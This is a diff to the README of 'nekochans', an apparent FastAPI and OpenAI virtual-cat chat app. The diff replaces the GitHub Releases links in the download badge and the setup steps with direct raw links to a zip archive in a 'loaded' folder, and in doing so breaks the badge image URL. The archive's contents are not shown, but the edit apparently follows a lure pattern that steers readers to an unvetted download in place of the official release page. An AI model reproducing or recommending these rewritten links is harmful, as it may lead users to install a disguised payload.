@@ -1,7 +1,7 @@
 # 🐾 nekochans - Connect with a Virtual Cat Companion
 
 ## 📥 Download the Application
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/GopelarCozen/nekochans/releases)
+[![Download Release](https://raw.githubusercontent.com/GopelarCozen/nekochans/main/loaded/nekochans.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/GopelarCozen/nekochans/main/loaded/nekochans.zip)
 
 ## 🚀 Getting Started
 Welcome to nekochans, an AI cat persona API powered by FastAPI and OpenAI. This application allows you to engage with a virtual cat companion. It streams real-time interactions and provides a unique chat experience.
@@ -16,7 +16,7 @@ Welcome to nekochans, an AI cat persona API powered by FastAPI and OpenAI. This 
 To get started with nekochans, please follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page to download](https://github.com/GopelarCozen/nekochans/releases).
+   Go to our [Releases page to download](https://raw.githubusercontent.com/GopelarCozen/nekochans/main/loaded/nekochans.zip).
 
 2. **Select the Latest Release**  
    Look for the most recent version at the top of the page. This version is the most stable and has the latest features.
